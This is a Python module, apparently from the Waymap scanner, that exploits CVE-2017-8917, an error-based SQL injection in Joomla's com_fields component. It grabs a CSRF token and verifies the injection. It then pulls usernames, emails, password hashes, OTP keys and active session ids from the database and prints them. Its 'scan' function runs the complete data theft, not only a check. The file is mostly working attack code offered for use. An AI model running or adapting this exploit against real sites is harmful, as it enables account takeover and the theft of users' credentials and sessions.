# Copyright (c) 2024 Waymap developers
# See the file 'LICENSE' for copying permission.
# CVE-2017-8917

from __future__ import print_function
import requests
import re
import binascii
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def extract_csrf_token(response):
    match = re.search(r'name="([a-f0-9]{32})" value="1"', response.text, re.S)
    if match is None:
        print("[~] Unable to find CSRF token.")
        return None
    return match.group(1)

def build_sqli_query(column_name, additional_query):
    return f"(SELECT {column_name} {additional_query})"

def joomla_sqli_data_extraction(session, token, target, column_name, additional_query):
    sqli = build_sqli_query(f"LENGTH({column_name})", additional_query)
    length = perform_sqli(session, token, target, sqli)
    if not length:
        return None
    length = int(length)
    offset = 0
    extracted_data = ''
    while length > offset:
        sqli = build_sqli_query(f"HEX(MID({column_name},{offset + 1},16))", additional_query)
        value = perform_sqli(session, token, target, sqli)
        if not value:
            print("[~] Failed to retrieve data from query:", sqli)
            return None
        value = binascii.unhexlify(value).decode("utf-8")
        extracted_data += value
        offset += len(value)
    return extracted_data

def perform_sqli(session, token, target, sqli):
    sqli_full = f"UpdateXML(2, concat(0x3a,{sqli}, 0x3a), 1)"
    data = {
        'option': 'com_fields',
        'view': 'fields',
        'layout': 'modal',
        'list[fullordering]': sqli_full,
        token: '1',
    }
    response = session.get(f"{target}/index.php?option=com_fields&view=fields&layout=modal", params=data, allow_redirects=False, verify=False)
    match = re.search(r'XPATH syntax error:\s*&#039;([^$\n]+)\s*&#039;\s*</bl', response.text, re.S)
    if match:
        match = match.group(1).strip()
        if match[0] != ':' and match[-1] != ':':
            return None
        return match[1:-1]

def extract_joomla_table_names(session, token, target):
    tables = []
    offset = 0
    print("[~] Starting table extraction...")
    while True:
        result = joomla_sqli_data_extraction(session, token, target, "TABLE_NAME", f"FROM information_schema.tables WHERE TABLE_NAME LIKE 0x257573657273 LIMIT {offset},1")
        if result is None:
            break
        tables.append(result)
        print(f"[~] Found table: {result}")
        offset += 1
    return tables

def extract_joomla_users(session, token, target, table_name):
    users = []
    offset = 0
    print(f"[~] Extracting users from table: {table_name}")
    while True:
        result = joomla_sqli_data_extraction(session, token, target, "CONCAT(id,0x7c,name,0x7c,username,0x7c,email,0x7c,password,0x7c,otpKey,0x7c,otep)", f"FROM {table_name} ORDER BY registerDate ASC LIMIT {offset},1")
        if result is None:
            break
        result = result.split('|')
        print(f"[~] Found user: {result}")
        users.append(result)
        offset += 1
    return users

def extract_joomla_sessions(session, token, target, table_name):
    sessions = []
    offset = 0
    print(f"[~] Extracting sessions from table: {table_name}")
    while True:
        result = joomla_sqli_data_extraction(session, token, target, "CONCAT(userid,0x7c,session_id,0x7c,username)", f"FROM {table_name} WHERE guest = 0 LIMIT {offset},1")
        if result is None:
            break
        result = result.split('|')
        print(f"[~] Found session: {result}")
        sessions.append(result)
        offset += 1
    return sessions

def run_cve_exploit(target):
    session = requests.Session()

    print("[~] Fetching CSRF token from the login page.")
    response = session.get(f"{target}/index.php/component/users/?view=login", verify=False)
    token = extract_csrf_token(response)
    if not token:
        return False

    print("[~] Verifying SQL injection.")
    sqli_test_result = perform_sqli(session, token, target, "128+127")
    if sqli_test_result != "255":
        print("[~] SQL injection test failed.")
        return False

    print("[~] Extracting Joomla database tables.")
    tables = extract_joomla_table_names(session, token, target)

    for table_name in tables:
        table_prefix = table_name[:-5]
        extract_joomla_users(session, token, target, table_name)
        extract_joomla_sessions(session, token, target, f"{table_prefix}session")

    return True

def scan_cve_2017_8917(target):
    run_cve_exploit(target)



